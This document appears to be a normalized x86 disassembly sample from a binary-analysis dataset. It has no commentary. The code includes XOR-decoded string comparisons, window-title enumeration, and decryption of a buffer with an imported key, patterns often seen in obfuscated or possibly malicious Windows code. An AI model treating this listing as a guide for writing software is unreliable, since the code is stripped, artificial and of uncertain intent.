jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_10003290
push eax
push esi
lea edi [ ebp - 0xf4 ]
call sub_10017cc0
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
push r--data
call sub_100651be
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_100215e0
mov [ ebp - 0x1c0 ] eax
push r--data
call sub_100651be
mov ecx [ ebp - 0x19c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x14
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x1c
push esi
call sub_10004e10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x1bc ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x17
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x38
push esi
call sub_10004e10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x1b0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1a
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x54
push esi
call sub_10004e10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x1c4 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0x148 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1d
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x70
push esi
call sub_10004e10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x1b8 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0x164 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1f
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x20
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x21
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x8c
push esi
call sub_10004e10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0x74 ] ebx
je r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
lea edi [ ebp - 0x190 ]
call sub_1001e5a0
push eax
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x25
call sub_1003acf0
mov esi 0x10
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov ecx [ ebp - 0x1c0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x22
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x23
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x24
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
cmp [ ebp - 0xa8 ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0xa8
push esi
call sub_10004e10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x19c ] ecx
mov eax [ ebp - 0xbc ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov edi 0xf
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xf4 ] bl
cmp [ ebp - 0x150 ] esi
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_1000a86e
add esp 0x4
mov edx [ ebp - 0xac ]
mov [ ebp - 0x1a0 ] edx
cmp [ ebp - 0xe0 ] esi
jb r-xdata
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x150 ] edi
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x164 ] bl
cmp [ ebp - 0x134 ] esi
jb r-xdata
mov ecx [ ebp - 0x164 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x138 ] ebx
mov [ ebp - 0x148 ] bl
cmp [ ebp - 0x8c ] esi
jb r-xdata
mov edx [ ebp - 0x148 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xa0 ] bl
cmp [ ebp - 0xfc ] esi
jb r-xdata
mov eax [ ebp - 0xa0 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
cmp [ ebp - 0x118 ] esi
jb r-xdata
mov ecx [ ebp - 0x110 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x12c ] bl
cmp [ ebp - 0xc4 ] esi
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x190 ]
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xd8 ] bl
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x18c ] ebx
mov [ ebp - 0x188 ] ebx
cmp [ ebp - 0x16c ] esi
jb r-xdata
mov ecx [ ebp - 0x1ac ]
push ecx
mov ecx [ ebp - 0x18c ]
lea edx [ ebp - 0x184 ]
push edx
push ecx
push eax
call sub_10072070
mov edx [ ebp - 0x190 ]
push edx
call sub_1000a86e
add esp 0x14
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x16c ] edi
mov [ ebp - 0x170 ] ebx
mov [ ebp - 0x180 ] bl
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov eax [ ebp - 0x180 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] bl
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1000a86e
add esp 0x4
sub_1003c040
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_1003c067
push 0x8
push r--data
call sub_1007fad0
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_100412eb
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_10006a59
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1004b450
push 0x214
push 0x1
call sub_100579de
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_100040bc
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_10012634
mov [ rw-data ] eax
call sub_1001d709
test eax eax
jns r-xdata
call sub_1003e1a8
jmp r-xdata
call sub_1007fb15
retn 0xc
xor eax eax
inc eax
push edi
call sub_10019794
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1005fac9
call sub_1003806a
test eax eax
js r-xdata
call sub_1006803e
jmp r-xdata
push esi
call sub_1001b2d2
pop ecx
jmp r-xdata
push edi
push esi
call sub_10034468
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003c140
jmp r-xdata
call sub_10026213
call sub_1006803e
call sub_1003e1a8
call sub_10026213
jmp r-xdata
call sub_10041625
test eax eax
js r-xdata
push 0x0
call sub_100663ce
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1003c1d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087e9c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi ] r--data
mov edx [ edi ]
lea ecx [ esi + 0xc ]
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx ] ax
mov eax edx
lea ebx [ eax + 0x2 ]
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x88 ] ebx
lea ebx [ ebx ]
mov bx [ eax ]
add eax 0x2
test bx bx
jne r-xdata
sub eax [ ebp - 0x88 ]
sar eax 0x1
push eax
push edx
call sub_10034100
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ edi + 0x20 ]
mov [ esi + 0x28 ] eax
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] edx
mov [ esi + 0x2c ] cx
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x4c ] edx
mov eax [ edi + 0x2c ]
mov [ esi + 0x50 ] eax
mov ecx [ edi + 0x28 ]
mov [ esi + 0x54 ] ecx
mov eax [ edi + 0x24 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x4c ]
mov [ esi + 0x5c ] ecx
mov eax [ edi + 0x48 ]
mov [ esi + 0x60 ] eax
mov ecx [ r--data ]
xor eax eax
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xff8f
and ebx 0xff
mov [ ebp + eax * 2 - 0x50 ] bx
inc eax
cmp eax 0x8
jb r-xdata
xor ecx ecx
mov [ ebp - 0x40 ] cx
mov ecx [ r--data ]
xor eax eax
lea ecx [ ecx ]
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xffa3
and ebx 0xff
mov [ ebp + eax * 2 - 0x84 ] bx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6c ] ax
lea esp [ esp ]
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xffb3
and ebx 0xff
mov [ ebp + eax * 2 - 0x2c ] bx
inc eax
cmp eax 0x7
jb r-xdata
xor ecx ecx
mov [ ebp - 0x1e ] cx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xff98
and ebx 0xff
mov [ ebp + eax * 2 - 0x3c ] bx
inc eax
cmp eax 0x7
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2e ] ax
lea esp [ esp ]
movsx ebx [ ecx + eax ]
xor ebx eax
xor ebx 0xffcd
and ebx 0xff
mov [ ebp + eax * 2 - 0x1c ] bx
inc eax
cmp eax 0x5
jb r-xdata
xor ecx ecx
mov [ ebp - 0x12 ] cx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x27
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ lstrcmpW@IAT ]
xor eax eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x54 ] ax
mov eax [ edi + 0x1c ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x3c ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x1
jmp r-xdata
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x84 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x2
jmp r-xdata
mov edx [ edi + 0x8 ]
mov eax edx
lea ebx [ eax + 0x2 ]
jmp r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x50 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x3
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x4
jmp r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
lea ecx [ esi + 0x2c ]
call sub_10034100
mov eax [ edi + 0x40 ]
mov [ esi + 0x68 ] eax
mov ecx [ edi + 0x44 ]
mov [ esi + 0x6c ] ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x68 ]
push edx
push eax
call ebx
neg eax
sbb eax eax
and eax 0xfffffffa
add eax 0x6
mov [ esi + 0x48 ] eax
mov [ esi + 0x48 ] 0x5
jmp r-xdata
sub_1003c490
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
lea eax [ ebp - 0x230 ]
push eax
push ebx
mov [ ebp - 0x22c ] ebx
call [ GetWindowThreadProcessId@IAT ]
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x20c ]
[ edi ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push ebx
call [ GetWindowTextW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x214 ] 0x7
mov [ ebp - 0x218 ] 0x0
mov [ ebp - 0x228 ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x20c ]
push edx
lea ecx [ ebp - 0x228 ]
call sub_10034100
mov edx [ esi + 0x4 ]
mov eax edx
lea edi [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea eax [ ebp - 0x228 ]
push eax
call sub_10020700
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x214 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x22c ]
xor eax eax
mov [ esi ] ecx
lea edx [ esi + 0x8 ]
movzx esi ax
mov eax esi
shl esi 0x10
or eax esi
mov esi [ ebp - 0x214 ]
mov ecx 0x82
mov edi edx
[ edi ]
mov edi [ ebp - 0x228 ]
mov eax edi
cmp esi 0x8
jae r-xdata
mov edx [ ebp - 0x228 ]
push edx
call sub_1000a86e
add esp 0x4
lea ecx [ ebx + ebx ]
push ecx
push eax
push edx
call sub_1007f580
add esp 0xc
cmp esi 0x8
jb r-xdata
lea eax [ ebp - 0x228 ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
push edi
call sub_1000a86e
add esp 0x4
sub_1003c60e
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
xor ebx ebx
push ebx
push 0x1
push ebx
mov [ ebp + 0xc ] eax
push ebx
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov esi [ ebp + 0x8 ]
push edi
push [ esi ]
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
push 0x2
mov edi [ edi ]
mov eax [ ebp + 0xc ]
sub eax edi
push eax
mov eax [ esi ]
add eax edi
push ebx
push eax
call sub_1007f8f0
add esp 0xc
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ edi ]
push [ esi ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push edi
push eax
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
mov [ esi ] eax
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_1003c700
push ebp
mov ebp esp
push 0xffffffff
push sub_100896b3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
movzx edx dx
mov [ ebp - 0x214 ] edx
mov edx [ ebx + 0x8 ]
sub edx [ ebx + 0x4 ]
lea esi [ ebx + 0x4 ]
mov [ ebp - 0x224 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x22c ] ecx
mov cl [ ebp + 0x14 ]
sar edx 0x2
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x228 ] edi
mov [ ebp - 0x21c ] cl
cmp edx 0x1e
jb r-xdata
push 0x110
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x210 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x210 ] ecx
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
lea ecx [ ebx + 0x64 ]
push ecx
lea edx [ ebx + 0x48 ]
push edx
lea ecx [ ebx + 0x2c ]
push ecx
mov ecx [ ebx + 0xbc ]
lea edx [ ebx + 0x80 ]
push edx
mov edx [ ebp - 0x21c ]
push ecx
mov ecx [ ebp - 0x214 ]
push edx
mov edx [ ebp - 0x224 ]
push edi
push ecx
mov ecx [ ebp - 0x220 ]
push edx
mov edx [ ebp - 0x22c ]
mov edi eax
call sub_1002cf90
mov edi [ ebp - 0x228 ]
mov [ ebp - 0x210 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x18
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
lea edx [ ebp - 0x218 ]
cmp ecx edx
ja r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x210 ]
mov [ ebp - 0x218 ] eax
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x218 ]
cmp ecx eax
jae r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_1000c5c0
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x4
mov ebx [ ebx + 0x8 ]
mov esi [ esi ]
mov eax ebx
sub eax esi
push sub_1003a6a0
sar eax 0x2
push eax
push ebx
push esi
call sub_10069070
add esp 0x10
lea edx [ ebp - 0x30 ]
mov eax 0x5b
call sub_10071e30
xor esi esi
mov ebx 0x7
xor ecx ecx
mov eax edi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov edx [ ebp - 0x210 ]
mov [ eax ] edx
mov eax [ esi ]
lea ecx [ eax + edi * 4 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_1000c5c0
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0xa0 ]
call sub_10034100
mov edi [ ebp - 0x220 ]
mov [ ebp - 0x4 ] 0x1
xor edx edx
mov eax edi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
lea ecx [ eax + 0x2 ]
lea ebx [ ebx ]
mov edi [ ebp - 0x228 ]
jmp r-xdata
mov ecx [ ecx ]
mov [ eax ] ecx
mov dx [ eax ]
add eax 0x2
cmp dx si
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x68 ]
call sub_10034100
movzx eax [ ebp - 0x214 ]
push eax
lea ecx [ ebp - 0x12c ]
push ecx
mov [ ebp - 0x4 ] 0x2
call sub_10057f20
add esp 0x8
mov [ ebp - 0x214 ] eax
mov edi [ ebp - 0x22c ]
mov [ ebp - 0x4 ] 0x3
xor edx edx
mov eax edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x4c ] dx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx si
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x4c ]
call sub_10034100
mov edx [ ebp - 0x224 ]
mov [ ebp - 0x4 ] 0x4
xor eax eax
mov [ ebp - 0x84 ] ax
mov eax edx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
lea ecx [ eax + 0x2 ]
lea esp [ esp ]
mov di [ eax ]
